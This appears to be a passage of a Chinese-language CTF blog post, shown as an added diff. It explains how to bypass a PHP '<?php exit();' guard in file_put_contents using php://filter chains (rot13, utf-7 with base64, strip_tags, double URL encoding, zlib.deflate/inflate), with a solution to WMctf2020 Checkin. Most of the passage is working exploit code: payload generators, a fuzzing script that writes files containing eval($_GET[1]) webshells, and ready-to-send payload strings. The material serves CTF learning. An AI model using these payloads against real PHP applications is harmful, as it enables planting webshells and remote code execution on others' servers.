+        <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,
+        <span class="hljs-string">&#x27;CP50220&#x27;</span>,
+        <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,
+        <span class="hljs-string">&#x27;CP50221&#x27;</span>,
+        <span class="hljs-string">&#x27;CP50222&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,
+        <span class="hljs-string">&#x27;byte2be&#x27;</span>,
+        <span class="hljs-string">&#x27;byte2le&#x27;</span>,
+        <span class="hljs-string">&#x27;byte4be&#x27;</span>,
+        <span class="hljs-string">&#x27;byte4le&#x27;</span>,
+        <span class="hljs-string">&#x27;BASE64&#x27;</span>,
+        <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,
+        <span class="hljs-string">&#x27;7bit&#x27;</span>,
+        <span class="hljs-string">&#x27;8bit&#x27;</span>,
+        <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,
+        <span class="hljs-string">&#x27;CP936&#x27;</span>,
+        <span class="hljs-string">&#x27;GB18030&#x27;</span>,
+        <span class="hljs-string">&#x27;HZ&#x27;</span>,
+        <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,
+        <span class="hljs-string">&#x27;CP950&#x27;</span>,
+        <span class="hljs-string">&#x27;BIG-5&#x27;</span>,
+        <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,
+        <span class="hljs-string">&#x27;UHC&#x27;</span>,
+        <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,
+        <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,
+        <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,
+        <span class="hljs-string">&#x27;CP866&#x27;</span>,
+        <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,
+        <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,
+        <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,
+    ];
+
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc_stack</span> = [
+        <span class="hljs-string">&#x27;convert&#x27;</span> =&gt; [
+            <span class="hljs-string">&#x27;from&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,
+            <span class="hljs-string">&#x27;to&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>
+        ],
+
+        <span class="hljs-string">&#x27;string&#x27;</span> =&gt; <span class="hljs-string">&#x27;rot13&#x27;</span>
+    ];
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatConvert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span></span>)</span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;convert.iconv.&#x27;</span>.<span class="hljs-variable">$convfrom</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$convto</span>.<span class="hljs-string">&#x27;|&#x27;</span>;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatString</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span></span>)</span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;string&#x27;</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$stringop</span>.<span class="hljs-string">&#x27;|&#x27;</span>;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">convert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span></span>)</span>&#123;
+        <span class="hljs-keyword">return</span> iconv(<span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span>);
+    &#125;
+
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">string</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span>,<span class="hljs-variable">$poc</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;string[<span class="hljs-variable">$stringop</span>](<span class="hljs-variable">$poc</span>);
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Run</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;
+        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;prefix;
+        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;base;
+        <span class="hljs-variable">$result_poc</span> = <span class="hljs-string">&quot;&quot;</span>;
+
+        <span class="hljs-keyword">foreach</span> (array_keys(<span class="hljs-keyword">$this</span>-&gt;poc_stack) <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;
+            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$item</span> == <span class="hljs-string">&#x27;string&#x27;</span>)&#123;
+                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatString(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>]);
+                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;string(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>],<span class="hljs-keyword">$this</span>-&gt;poc);
+            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;convert&#x27;</span>)&#123;
+                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatConvert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>]);
+                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;convert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc);
+
+            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;$zlib&#x27;</span>)&#123;
+                ;
+            &#125;
+        &#125;
+
+        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$result</span>;
+
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;length:&quot;</span>,strlen(<span class="hljs-variable">$tmp</span>),<span class="hljs-string">&quot;\n&quot;</span>;
+        <span class="hljs-variable">$padding</span> = <span class="hljs-string">&quot;&quot;</span>;
+
+        <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-string">&#x27;convert&#x27;</span>][<span class="hljs-string">&#x27;from&#x27;</span>])&#123;
+            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;UCS-2LE&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>:
+                <span class="hljs-variable">$paddingnum</span> = strlen(<span class="hljs-variable">$tmp</span>)%<span class="hljs-number">2</span>;
+                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$paddingnum</span> !== <span class="hljs-number">0</span>)&#123;
+                    <span class="hljs-variable">$padding</span> = str_repeat(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-variable">$paddingnum</span>);
+                &#125;
+                <span class="hljs-keyword">break</span>;
+            <span class="hljs-keyword">default</span>:
+                ;
+        &#125;
+        
+        <span class="hljs-variable">$result</span> .= <span class="hljs-variable">$padding</span>;
+        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;poc;
+        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;end;
+        <span class="hljs-keyword">echo</span> substr(<span class="hljs-variable">$result</span>,strlen(<span class="hljs-keyword">$this</span>-&gt;prefix)),<span class="hljs-string">&quot;\n&quot;</span>;
+    &#125;
+&#125;
+
+
+<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Generate();
+<span class="hljs-variable">$a</span>-&gt;Run();</code></pre></div>
+
+
+
+<h3 id="5-utf8编码转为utf7配合base64"><a href="#5-utf8编码转为utf7配合base64" class="headerlink" title="5. utf8编码转为utf7配合base64"></a>5. utf8编码转为utf7配合base64</h3><p>前面介绍单独用base64编码是不可行的，那么来一套组合拳是否可以呢？答案肯定是可以的，这里感谢大兄弟<a target="_blank" rel="noopener" href="http://yulige.top/">郁离歌</a>提供的方法，通过iconv将utf8编码转为utf7编码，从而把 <strong>=</strong> 给转了，就不会影响到base64的解码了</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php&#x27;</span>; <span class="hljs-comment">#base64编码前补了AA，原理一样，补齐位数</span></code></pre></div>
+
+
+
+<h3 id="6-strip-tags配合base64"><a href="#6-strip-tags配合base64" class="headerlink" title="6. strip_tags配合base64"></a>6. strip_tags配合base64</h3><p>我们来用一下strip_tags方法&amp;&amp;base64的组合，不过之前构造的这种方法有局限性，要求服务器是linux系统，所以之前没写。因为前面介绍过strip_tags去除的是完整的标签以及内容，而base64要求中间不能出现 <code>=</code> 所以把他们二者组合起来</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php&#x27;</span>;</code></pre></div>
+
+
+
+<p>理解起来也很简单，在文件名前加上<code>?&gt;</code>把<code>&lt;?php exit();</code>闭合，同时 = 也在闭合标签之间，所以利用strip_tags处理的时候直接把<code>&lt;?php ...... ?&gt;</code>内的所有内容都删除了，然后对剩下的部分，也就是<code>PD9waHAgcGhwaW5mbygpOz8+.php</code>进行base64解码，为什么说这种构造Windows不行呢，因为Windows不支持文件名中有<code>?</code>、<code>&gt;</code>这类字符</p>
+<h3 id="7-二次编码特性配合过滤器"><a href="#7-二次编码特性配合过滤器" class="headerlink" title="7. 二次编码特性配合过滤器"></a><strong>7. 二次编码特性配合过滤器</strong></h3><p>查看伪协议处理的源码</p>
+<div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">php_stream_apply_filter_list</span><span class="hljs-params">(php_stream *stream, <span class="hljs-keyword">char</span> *filterlist, <span class="hljs-keyword">int</span> read_chain, <span class="hljs-keyword">int</span> write_chain)</span> <span class="hljs-comment">/* &#123;&#123;&#123; */</span></span>
+<span class="hljs-function"></span>&#123;
+	<span class="hljs-keyword">char</span> *p, *token = <span class="hljs-literal">NULL</span>;
+	php_stream_filter *temp_filter;
+
+	p = php_strtok_r(filterlist, <span class="hljs-string">&quot;|&quot;</span>, &amp;token);
+	<span class="hljs-keyword">while</span> (p) &#123;
+		php_url_decode(p, <span class="hljs-built_in">strlen</span>(p));#👈对过滤器进行了一次urldecode
+		<span class="hljs-keyword">if</span> (read_chain) &#123;
+			<span class="hljs-keyword">if</span> ((temp_filter = php_stream_filter_create(p, <span class="hljs-literal">NULL</span>, php_stream_is_persistent(stream)))) &#123;
+				php_stream_filter_append(&amp;stream-&gt;readfilters, temp_filter);
+			&#125; <span class="hljs-keyword">else</span> &#123;
+				php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Unable to create filter (%s)&quot;</span>, p);
+			&#125;
+		&#125;
+		<span class="hljs-keyword">if</span> (write_chain) &#123;
+			<span class="hljs-keyword">if</span> ((temp_filter = php_stream_filter_create(p, <span class="hljs-literal">NULL</span>, php_stream_is_persistent(stream)))) &#123;
+				php_stream_filter_append(&amp;stream-&gt;writefilters, temp_filter);
+			&#125; <span class="hljs-keyword">else</span> &#123;
+				php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Unable to create filter (%s)&quot;</span>, p);
+			&#125;
+		&#125;
+		p = php_strtok_r(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;|&quot;</span>, &amp;token);
+	&#125;
+&#125;</code></pre></div>
+
+<p>file_put_contents中可以调用伪协议，而<strong>伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的</strong>，不过我们在服务端ban了%25（用%25太简单了）所以测试%25被ban后就可以写个脚本跑一下字符，构造一些过滤的字符就可以利用正常的姿势绕过。知道可以用二次编码绕过了，可以简单构造一下参见的payload即可，可参考我之前写的文章中的一些payload</p>
+<p>url二次编码脚本</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$char</span> = <span class="hljs-string">&#x27;r&#x27;</span>; <span class="hljs-comment">#构造r的二次编码</span>
+<span class="hljs-keyword">for</span> (<span class="hljs-variable">$ascii1</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$ascii1</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$ascii1</span>++) &#123;
+	<span class="hljs-keyword">for</span> (<span class="hljs-variable">$ascii2</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$ascii2</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$ascii2</span>++) &#123;
+		<span class="hljs-variable">$aaa</span> = <span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$ascii1</span>.<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$ascii2</span>;
+		<span class="hljs-keyword">if</span>(urldecode(urldecode(<span class="hljs-variable">$aaa</span>)) == <span class="hljs-variable">$char</span>)&#123;
+			<span class="hljs-keyword">echo</span> <span class="hljs-variable">$char</span>.<span class="hljs-string">&#x27;: &#x27;</span>.<span class="hljs-variable">$aaa</span>;
+			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;
+		&#125;
+	&#125;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+
+
+<p>使用burp也是一样的。</p>
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906195755600.png" alt="image-20200906195755600"></p>
+<h3 id="8-zlib-deflate与zlib-inflate结合其他过滤器"><a href="#8-zlib-deflate与zlib-inflate结合其他过滤器" class="headerlink" title="8. zlib.deflate与zlib.inflate结合其他过滤器"></a>8. zlib.deflate与zlib.inflate结合其他过滤器</h3><ul>
+<li>zlib.deflate与zlib.inflate结合之后内容肯定不变，我们只需要在其中加入别的过滤器，即可</li>
+<li>在wmctf中，zlib.deflate与zlib.inflate中间加入string.tolower过滤器会使&lt;?php exit(); 变成&lt;?php@�xit()无法解析。</li>
+</ul>
+<p>尝试脚本</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$a</span> = [
+    <span class="hljs-string">&#x27;string.toupper&#x27;</span>,
+    <span class="hljs-string">&#x27;string.tolower&#x27;</span>,
+    <span class="hljs-string">&#x27;string.strip_tags&#x27;</span>,
+    <span class="hljs-string">&#x27;convert.base64-encode&#x27;</span>,
+    <span class="hljs-string">&#x27;convert.base64-decode&#x27;</span>,
+    <span class="hljs-string">&#x27;ASCII&#x27;</span>,
+    <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS&#x27;</span>,
+    <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,
+    <span class="hljs-string">&#x27;CP932&#x27;</span>,
+    <span class="hljs-string">&#x27;CP51932&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,
+    <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,
+    <span class="hljs-string">&#x27;JIS&#x27;</span>,
+    <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,
+    <span class="hljs-string">&#x27;CP50220&#x27;</span>,
+    <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,
+    <span class="hljs-string">&#x27;CP50221&#x27;</span>,
+    <span class="hljs-string">&#x27;CP50222&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,
+    <span class="hljs-string">&#x27;byte2be&#x27;</span>,
+    <span class="hljs-string">&#x27;byte2le&#x27;</span>,
+    <span class="hljs-string">&#x27;byte4be&#x27;</span>,
+    <span class="hljs-string">&#x27;byte4le&#x27;</span>,
+    <span class="hljs-string">&#x27;BASE64&#x27;</span>,
+    <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,
+    <span class="hljs-string">&#x27;7bit&#x27;</span>,
+    <span class="hljs-string">&#x27;8bit&#x27;</span>,
+    <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,
+    <span class="hljs-string">&#x27;CP936&#x27;</span>,
+    <span class="hljs-string">&#x27;GB18030&#x27;</span>,
+    <span class="hljs-string">&#x27;HZ&#x27;</span>,
+    <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,
+    <span class="hljs-string">&#x27;CP950&#x27;</span>,
+    <span class="hljs-string">&#x27;BIG-5&#x27;</span>,
+    <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,
+    <span class="hljs-string">&#x27;UHC&#x27;</span>,
+    <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,
+    <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,
+    <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,
+    <span class="hljs-string">&#x27;CP866&#x27;</span>,
+    <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,
+    <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,
+    <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,
+];
+@mkdir(<span class="hljs-string">&#x27;./test&#x27;</span>);
+@chdir(<span class="hljs-string">&#x27;./test&#x27;</span>);
+
+<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;
+    <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;php://filter/zlib.deflate|&#x27;</span> . <span class="hljs-variable">$item</span> . <span class="hljs-string">&#x27;|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e&#x27;</span>.<span class="hljs-variable">$item</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;
+    file_put_contents(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span> . <span class="hljs-variable">$content</span>);
+&#125;
+</code></pre></div>
+
+
+
+<h2 id="例题：WMctf2020-Checkin"><a href="#例题：WMctf2020-Checkin" class="headerlink" title="例题：WMctf2020 Checkin"></a>例题：WMctf2020 Checkin</h2><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">//PHP 7.0.33 Apache/2.4.25</span>
+error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_REAL_IP&#x27;</span>]);
+@mkdir(<span class="hljs-variable">$sandbox</span>);
+@chdir(<span class="hljs-variable">$sandbox</span>);
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;
+    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];
+    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="hljs-variable">$content</span>))
+         <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);
+    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$content</span>))
+        <span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$content</span>);
+    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;
+    file_put_contents(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span>.<span class="hljs-variable">$content</span>);
+&#125;</code></pre></div>
+
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>利用二次编码绕过</p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">content</span>=php://filter/write=string.%<span class="hljs-number">7</span>%<span class="hljs-number">32</span>ot<span class="hljs-number">13</span>|%<span class="hljs-number">3</span>C?cuc%<span class="hljs-number">20</span>cucvasb();?%<span class="hljs-number">3</span>E/resource=drom.php</code></pre></div>
+
+
+
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用phpfuzz过滤器脚本看看哪些过滤器能用</p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">string</span>.toupper
+<span class="hljs-attribute">string</span>.tolower
+<span class="hljs-attribute">string</span>.strip_tags
+<span class="hljs-attribute">zlib</span>.deflate
+<span class="hljs-attribute">zlib</span>.inflate
+<span class="hljs-attribute">bzip2</span>.compress
+<span class="hljs-attribute">bzip2</span>.decompress
+<span class="hljs-attribute">ASCII</span>
+<span class="hljs-attribute">EUC</span>-JP
+<span class="hljs-attribute">SJIS</span>
+<span class="hljs-attribute">eucJP</span>-win
+<span class="hljs-attribute">SJIS</span>-win
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS
+<span class="hljs-attribute">CP932</span>
+<span class="hljs-attribute">CP51932</span>
+<span class="hljs-attribute">SJIS</span>-mac
+<span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO
+<span class="hljs-attribute">SJIS</span>-Mobile#KDDI
+<span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI
+<span class="hljs-attribute">JIS</span>
+<span class="hljs-attribute">JIS</span>-ms
+<span class="hljs-attribute">CP50220</span>
+<span class="hljs-attribute">CP50220raw</span>
+<span class="hljs-attribute">CP50221</span>
+<span class="hljs-attribute">CP50222</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span>
+<span class="hljs-attribute">byte2be</span>
+<span class="hljs-attribute">byte2le</span>
+<span class="hljs-attribute">byte4be</span>
+<span class="hljs-attribute">byte4le</span>
+<span class="hljs-attribute">HTML</span>-ENTITIES
+<span class="hljs-attribute">7bit</span>
+<span class="hljs-attribute">8bit</span>
+<span class="hljs-attribute">EUC</span>-CN
+<span class="hljs-attribute">CP936</span>
+<span class="hljs-attribute">GB18030</span>
+<span class="hljs-attribute">HZ</span>
+<span class="hljs-attribute">EUC</span>-TW
+<span class="hljs-attribute">CP950</span>
+<span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span>
+<span class="hljs-attribute">EUC</span>-KR
+<span class="hljs-attribute">UHC</span>
+<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR
+<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span>
+<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span>
+<span class="hljs-attribute">CP866</span>
+<span class="hljs-attribute">KOI8</span>-R
+<span class="hljs-attribute">KOI8</span>-U
+<span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span></code></pre></div>
+
+
+
+<p>最好用的应该就是<code>zlib</code>的<code>zlib.deflate</code>和<code>zlib.inflate</code>，组合使用压缩后再解压后内容肯定不变</p>
+<p>这种方法就需要将前面的标签闭合，闭合后如果能够直接干掉exit最好，如果不行就只能用string.strip_tags过滤器再进行过滤</p>
+<p>可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit</p>
+<p>  <img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906205447664.png" alt="image-20200906205447664"></p>
+<p>别的过滤器好像都没有变</p>
+<h2 id="fuzz辅助脚本编写"><a href="#fuzz辅助脚本编写" class="headerlink" title="fuzz辅助脚本编写"></a>fuzz辅助脚本编写</h2><h3 id="过滤器字典："><a href="#过滤器字典：" class="headerlink" title="过滤器字典："></a>过滤器字典：</h3><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">string</span>.rot<span class="hljs-number">13</span>
+<span class="hljs-attribute">string</span>.toupper
+<span class="hljs-attribute">string</span>.tolower
+<span class="hljs-attribute">string</span>.strip_tags 
+<span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-encode
+<span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-decode
+<span class="hljs-attribute">zlib</span>.deflate
+<span class="hljs-attribute">zlib</span>.inflate
+<span class="hljs-attribute">bzip2</span>.compress
+<span class="hljs-attribute">bzip2</span>.decompress
+<span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-encode
+<span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-decode
+<span class="hljs-attribute">convert</span>.quoted-printable-encode
+<span class="hljs-attribute">convert</span>.quoted-printable-decode
+<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>
